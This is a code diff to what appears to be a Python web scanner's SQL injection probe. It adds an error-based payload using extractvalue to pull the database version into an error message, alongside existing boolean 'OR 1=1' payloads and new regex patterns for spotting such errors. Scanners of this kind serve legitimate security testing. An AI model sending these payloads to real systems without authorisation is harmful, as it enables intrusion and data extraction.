@@ -19,7 +19,8 @@ SQL_ERRORS = re.compile(
     r"sql syntax|mysql|mariadb|sqlite3?|postgresql|pg_query|ORA-\d{4}|"
     r"microsoft sql|incorrect syntax|db2 |sql server|pl/sql|"
     r"odbc|jdbc|sqlstate|unclosed quotation|unterminated string|"
-    r"syntax error.*sql|warning.*mysql|division by zero.*sql",
+    r"syntax error.*sql|warning.*mysql|division by zero.*sql|"
+    r"xpath syntax|extractvalue|updatexml|floor\(rand",
     re.I,
 )
 _CLIENT_REDIRECT = re.compile(
@@ -138,11 +139,16 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
     ofalse_r = _send(ctx, url, param, "1' OR '1'='2", method, data, tool, "ofalse")
     notrue_r = _send(ctx, url, param, "1 OR 1=1", method, data, tool, "notrue")
     nofalse_r = _send(ctx, url, param, "1 OR 1=2", method, data, tool, "nofalse")
+    # error-based exfil: XPATH errors literally echo the extracted value
+    xp = _send(ctx, url, param,
+               "1' AND extractvalue(1,concat(0x7e,version()))-- -",
+               method, data, tool, "xpath-exfil")
 
     pairs = (("base", base), ("quote", quote), ("true", true_r),
              ("false", false_r), ("ntrue", ntrue_r), ("nfalse", nfalse_r),
              ("otrue", otrue_r), ("ofalse", ofalse_r),
-             ("notrue", notrue_r), ("nofalse", nofalse_r))
+             ("notrue", notrue_r), ("nofalse", nofalse_r),
+             ("xpath", xp))
     bodies = {k: r.get("body", "") for k, r in pairs}
     error_hits = {k: m.group(0) for k, b in bodies.items()
                   if (m := SQL_ERRORS.search(b))}
@@ -156,7 +162,13 @@ def probe_sqli(ctx: Context, url: str, param: str, method: str = "GET",
     nostatus_diff = notrue_r["status"] != nofalse_r["status"]
 
     verdict, signal = "no signal", None
-    if error_hits and "quote" in error_hits:
+    xp_echo = bool(re.search(r"xpath syntax|extractvalue|updatexml",
+                             bodies["xpath"], re.I))
+    if xp_echo:
+        verdict, signal = ("error-based candidate (xpath exfil - "
+                           "extracted value echoed in the error)",
+                           error_hits.get("xpath", "xpath error"))
+    elif error_hits and "quote" in error_hits:
         verdict, signal = "error-based candidate", error_hits.get("quote")
     elif sim < 0.85 or status_diff:
         verdict = "boolean-blind candidate"
